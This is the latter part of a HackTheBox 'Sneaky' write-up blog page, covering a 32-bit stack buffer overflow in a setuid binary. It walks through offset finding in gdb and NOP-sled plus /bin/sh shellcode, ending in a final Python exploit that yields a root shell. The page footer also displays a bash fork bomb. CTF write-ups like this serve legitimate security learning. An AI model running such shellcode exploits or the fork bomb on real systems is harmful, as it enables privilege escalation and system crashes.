   0x0804841d &lt;+0&gt;:     push   ebp
   0x0804841e &lt;+1&gt;:     mov    ebp,esp
   0x08048420 &lt;+3&gt;:     and    esp,0xfffffff0
   0x08048423 &lt;+6&gt;:     sub    esp,0x170
   0x08048429 &lt;+12&gt;:    mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc]
   0x0804842c &lt;+15&gt;:    add    eax,0x4
   0x0804842f &lt;+18&gt;:    mov    eax,DWORD PTR <span class="o">[</span>eax]
   0x08048431 &lt;+20&gt;:    mov    DWORD PTR <span class="o">[</span>esp+0x4],eax
   0x08048435 &lt;+24&gt;:    lea    eax,[esp+0x12]
   0x08048439 &lt;+28&gt;:    mov    DWORD PTR <span class="o">[</span>esp],eax
   0x0804843c &lt;+31&gt;:    call   0x80482f0 &lt;strcpy@plt&gt;
   0x08048441 &lt;+36&gt;:    mov    eax,0x0
   0x08048446 &lt;+41&gt;:    leave
   0x08048447 &lt;+42&gt;:    ret
End of assembler dump.
</pre></table></code></div></div><p>Also this binary copies given command-line argument to a variable.</p><h1 id="finding-offset">Finding offset</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>pattern create 500
<span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A'</span>
gdb-peda<span class="nv">$ </span>r <span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A'</span>
Starting program: /root/HTB/Sneaky/privesc/chal <span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A'</span>

Program received signal SIGSEGV, Segmentation fault.
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
EAX: 0x0
EBX: 0x0
ECX: 0xffffd400 <span class="o">(</span><span class="s2">"sgAs6A"</span><span class="o">)</span>
EDX: 0xffffd030 <span class="o">(</span><span class="s2">"sgAs6A"</span><span class="o">)</span>
ESI: 0xf7fa1000 <span class="nt">--</span><span class="o">&gt;</span> 0x1e4d6c
EDI: 0xf7fa1000 <span class="nt">--</span><span class="o">&gt;</span> 0x1e4d6c
EBP: 0x41712541 <span class="o">(</span><span class="s1">'A%qA'</span><span class="o">)</span>
ESP: 0xffffcfb0 <span class="o">(</span><span class="s2">"rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs</span><span class="nv">$AsnAsCAs</span><span class="s2">-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A"</span><span class="o">)</span>
EIP: 0x25415525 <span class="o">(</span><span class="s1">'%UA%'</span><span class="o">)</span>
EFLAGS: 0x10202 <span class="o">(</span>carry parity adjust zero sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
Stopped reason: SIGSEGV
0x25415525 <span class="k">in</span> ?? <span class="o">()</span>
</pre></table></code></div></div><p>Offset comes as <code class="language-plaintext highlighter-rouge">362</code> for EIP.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>pattern search <span class="nv">$eip</span>
Registers contain pattern buffer:
EBP+0 found at offset: 358
EIP+0 found at offset: 362
</pre></table></code></div></div><h1 id="confirming-the-offset">Confirming the offset</h1><p>Sending <code class="language-plaintext highlighter-rouge">362</code> A’s and <code class="language-plaintext highlighter-rouge">4</code> B’s and watching if they end up on <code class="language-plaintext highlighter-rouge">EIP</code>:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>r <span class="si">$(</span>python3 <span class="nt">-c</span> <span class="s1">'print("A"*362 + "B"*4)'</span><span class="si">)</span>
Starting program: /root/HTB/Sneaky/privesc/chal <span class="si">$(</span>python3 <span class="nt">-c</span> <span class="s1">'print("A"*362 + "B"*4)'</span><span class="si">)</span>

Program received signal SIGSEGV, Segmentation fault.
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
EAX: 0x0
EBX: 0x0
ECX: 0xffffd400 <span class="o">(</span><span class="s2">"AABBBB"</span><span class="o">)</span>
EDX: 0xffffd02a <span class="o">(</span><span class="s2">"AABBBB"</span><span class="o">)</span>
ESI: 0xf7fa1000 <span class="nt">--</span><span class="o">&gt;</span> 0x1e4d6c
EDI: 0xf7fa1000 <span class="nt">--</span><span class="o">&gt;</span> 0x1e4d6c
EBP: 0x41414141 <span class="o">(</span><span class="s1">'AAAA'</span><span class="o">)</span>
ESP: 0xffffd030 <span class="nt">--</span><span class="o">&gt;</span> 0x0
EIP: 0x42424242 <span class="o">(</span><span class="s1">'BBBB'</span><span class="o">)</span>
EFLAGS: 0x10202 <span class="o">(</span>carry parity adjust zero sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
Invalid <span class="nv">$PC</span> address: 0x42424242
</pre></table></code></div></div><h1 id="getting-binsh-shellcode">Getting /bin/sh shellcode</h1><p>Getting <code class="language-plaintext highlighter-rouge">/bin/sh</code> shellcode for x86, as it’s a 32bit binary. Googling: <code class="language-plaintext highlighter-rouge">/bin/sh shellcode x86</code> 28 bytes: <a href="https://packetstormsecurity.com/files/115010/Linux-x86-execve-bin-sh-Shellcode.html">packetstorm</a></p><h1 id="getting-eip-address">Getting eip address</h1><p>I’ll send 400 bytes of B’s and see where in the stack they end up.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="o">(</span>gdb<span class="o">)</span> r <span class="si">$(</span>python3 <span class="nt">-c</span> <span class="s1">'print("B"*400)'</span><span class="si">)</span>
Starting program: /usr/local/bin/chal <span class="si">$(</span>python3 <span class="nt">-c</span> <span class="s1">'print("B"*400)'</span><span class="si">)</span>
Program received signal SIGSEGV, Segmentation fault.
0x42424242 <span class="k">in</span> ?? <span class="o">()</span>
</pre></table></code></div></div><p>Running <code class="language-plaintext highlighter-rouge">x/100x $esp</code> shows some B’s which are nothing as compared to 400 we sent. Trying to see 400 bytes behind <code class="language-plaintext highlighter-rouge">esp</code>:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="o">(</span>gdb<span class="o">)</span> x/100x <span class="nv">$esp</span><span class="nt">-400</span>
0xbffff3b0:     0xbffff3d2      0x00000000      0x00000000      0x08048441
0xbffff3c0:     0xbffff3d2      0xbffff712      0x0804821d      0xb7fffc24
0xbffff3d0:     0x424218fc      0x42424242      0x42424242      0x42424242
0xbffff3e0:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff3f0:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff400:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff410:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff420:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff430:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff440:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff450:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff460:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff470:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff480:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff490:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff4a0:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff4b0:     0x42424242      0x42424242      0x42424242      0x42424242
</pre></table></code></div></div><p>We can any address of these which shows <code class="language-plaintext highlighter-rouge">0x42</code> or B, as we’ll send NOPS to the rest of the stack. I chose <code class="language-plaintext highlighter-rouge">0xbffff3f0</code> for <code class="language-plaintext highlighter-rouge">eip</code>.</p><h1 id="exploitation">Exploitation</h1><p>What I’m trying to do here is send my shellcode in the stack, then point <code class="language-plaintext highlighter-rouge">eip</code> to exact that address or above that address. (It doesn’t matter if our address is a bit off, it’ll try to run NOPS, then our shellcode.) Payload looks something like this: <code class="language-plaintext highlighter-rouge">NOPS + SHELLCODE + EIP</code></p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span><span class="kn">import</span> <span class="nn">sys</span>

<span class="n">offset</span> <span class="o">=</span> <span class="mi">362</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80</span><span class="s">"</span>
<span class="n">nopsled</span><span class="o">=</span><span class="sa">b</span><span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span><span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
<span class="c1">#eip 0xbffff3f0
</span><span class="n">eip</span><span class="o">=</span><span class="sa">b</span><span class="s">"</span><span class="se">\xf0\xf3\xff\xbf</span><span class="s">"</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">nopsled</span> <span class="o">+</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="n">eip</span>
<span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</pre></table></code></div></div><p>But this payload didn’t work and that can be because of a long shellcode. I tried to find check why this doesn’t work and it seems like the nopsled breaks in between:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="o">(</span>gdb<span class="o">)</span> x/100x <span class="nv">$esp</span><span class="nt">-300</span>
0xbffff444:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff454:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff464:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff474:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff484:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff494:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff4a4:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff4b4:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff4c4:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff4d4:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff4e4:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff4f4:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff504:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff514:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff524:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff534:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff544:     0x90909090      0x90909090      0x90909090      0x6850c031
0xbffff554:     0x68732f2f      0x69622f68      0x89e3896e      0xb0c289c1
0xbffff564:     0x3180cd0b      0x80cd40c0      0xbffff3f0      0x00000000
0xbffff574:     0xbffff604      0xbffff610      0xb7feccca      0x00000002
0xbffff584:     0xbffff604      0xbffff5a4      0x0804a014      0x0804821c
0xbffff594:     0xb7fce000      0x00000000      0x00000000      0x00000000
0xbffff5a4:     0x4c7a61ee      0x74e5e5fe      0x00000000      0x00000000
0xbffff5b4:     0x00000000      0x00000002      0x08048320      0x00000000
0xbffff5c4:     0xb7ff24c0      0xb7e3ba09      0xb7fff000      0x00000002
</pre></table></code></div></div><p>Finding where nopslead continues later on, it gave me <code class="language-plaintext highlighter-rouge">0xbffff74c</code>:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="o">(</span>gdb<span class="o">)</span> x/100x <span class="nv">$esp</span>+300
0xbffff69c:     0x00000020      0x00000005      0x00000009      0x00000007
0xbffff6ac:     0xb7fde000      0x00000008      0x00000000      0x00000009
0xbffff6bc:     0x08048320      0x0000000b      0x000003e8      0x0000000c
0xbffff6cc:     0x000003e8      0x0000000d      0x000003e8      0x0000000e
0xbffff6dc:     0x000003e8      0x00000017      0x00000001      0x00000019
0xbffff6ec:     0xbffff70b      0x0000001f      0xbfffffe8      0x0000000f
0xbffff6fc:     0xbffff71b      0x00000000      0x00000000      0xbf000000
0xbffff70c:     0x40d50dab      0x8448d9c8      0xbf0b9c5f      0x692fa6f5
0xbffff71c:     0x00363836      0x7273752f      0x636f6c2f      0x622f6c61
0xbffff72c:     0x632f6e69      0x006c6168      0x90909090      0x90909090
0xbffff73c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff74c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff75c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff76c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff77c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff78c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff79c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7ac:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7bc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7cc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7dc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7ec:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7fc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff80c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff81c:     0x90909090      0x90909090      0x90909090      0x90909090
</pre></table></code></div></div><p>Final exploit:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="c">#!/usr/bin/python</span>
import sys

offset <span class="o">=</span> 362
shellcode <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73"</span>
shellcode+<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89"</span>
shellcode+<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c2</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b"</span>
shellcode+<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">40</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>

<span class="nv">nopsled</span><span class="o">=</span>b<span class="s2">"</span><span class="se">\x</span><span class="s2">90"</span> <span class="k">*</span><span class="o">(</span>offset - len<span class="o">(</span>shellcode<span class="o">))</span>
<span class="c"># eip 0xbffff750</span>
<span class="nv">eip</span><span class="o">=</span>b<span class="s2">"</span><span class="se">\x</span><span class="s2">4c</span><span class="se">\x</span><span class="s2">f7</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">bf"</span>
payload <span class="o">=</span> nopsled + shellcode + eip
sys.stdout.buffer.write<span class="o">(</span>payload<span class="o">)</span>
</pre></table></code></div></div><p>Running the exploit:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>thrasivoulos@Sneaky:~<span class="nv">$ </span>/usr/local/bin/chal <span class="sb">`</span>python3 script.py <span class="sb">`</span>
<span class="c"># whoami</span>
root
<span class="c"># cat /root/root.txt</span>
c5153d86cb175a9d5d9a5cc81736fb33
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/binary-exploitation/'>Binary Exploitation</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/ipv6/" class="post-tag no-text-decoration" >ipv6</a> <a href="/tags/sql-injection/" class="post-tag no-text-decoration" >sql-injection</a> <a href="/tags/buffer-overflow/" class="post-tag no-text-decoration" >buffer-overflow</a> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >hackthebox</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Sneaky - TheCaretaker&url=https://0xcaretaker.github.io/posts/Sneaky/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Sneaky - TheCaretaker&u=https://0xcaretaker.github.io/posts/Sneaky/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Sneaky - TheCaretaker&url=https://0xcaretaker.github.io/posts/Sneaky/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Nullcon_Winja_CTF_2022_Writeups_-_Active_Directory/">Nullcon Winja CTF 2022 Writeups - Active Directory</a></li><li><a href="/posts/Automation_on_the_Fly/">Automation on the Fly</a></li><li><a href="/posts/Vault/">Vault</a></li><li><a href="/posts/Knife/">Knife</a></li><li><a href="/posts/Ypuffy/">Ypuffy</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/buffer-overflow/">buffer overflow</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/sql-injection/">sql injection</a> <a class="post-tag" href="/tags/return-to-libc/">return to libc</a> <a class="post-tag" href="/tags/mysql/">mysql</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/wordpress/">wordpress</a> <a class="post-tag" href="/tags/pivoting/">pivoting</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Recommend the other 3 posts according to the tags and categories of the current post, if the number is not enough, use the other latest posts to supplement. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Enterprise/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Jul 26, 2021 <i class="unloaded">2021-07-26T20:58:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Enterprise</h3><div class="text-muted small"><p> Masscan + Nmap 1 2 3 4 5 6 $ masscan -p1-65535,U:1-65535 `IP` --rate=10000 -e tun0 | tee masscan.out Discovered open port 32812/tcp on 10.10.10.61 Discovered open ...</p></div></div></a></div><div class="card"> <a href="/posts/Safe/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Jul 20, 2021 <i class="unloaded">2021-07-20T17:50:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Safe</h3><div class="text-muted small"><p> Masscan + Nmap $ masscan -p1-65535,U:1-65535 `IP` --rate=10000 -e tun0 | tee masscan.out Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2021-07-16 17:00:22 GMT -- forced options: -sS -Pn -n --...</p></div></div></a></div><div class="card"> <a href="/posts/October/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Jul 12, 2021 <i class="unloaded">2021-07-12T13:35:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>October</h3><div class="text-muted small"><p> Enumeration Nmap $ nmap -sVC --min-rate 1000 `IP` -oN nmap.out PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | ...</p></div></div></a></div></div></div><!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Safe/" class="btn btn-outline-primary"><p>Safe</p></a> <a href="/posts/Apocalyst/" class="btn btn-outline-primary"><p>Apocalyst</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script> <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="thecaretaker" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> <br> <br> © 2022 <a href="https://twitter.com/0xCaretaker">Deepak Dhasmana</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span> <br> <script src="https://www.hackthebox.eu/badge/371479"></script></p></div><div class="footer-right"><p class="mb-0"><h4>:(){ :|: &amp; }; :</h4></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/buffer-overflow/">buffer overflow</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/sql-injection/">sql injection</a> <a class="post-tag" href="/tags/return-to-libc/">return to libc</a> <a class="post-tag" href="/tags/mysql/">mysql</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/wordpress/">wordpress</a> <a class="post-tag" href="/tags/pivoting/">pivoting</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://0xcaretaker.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
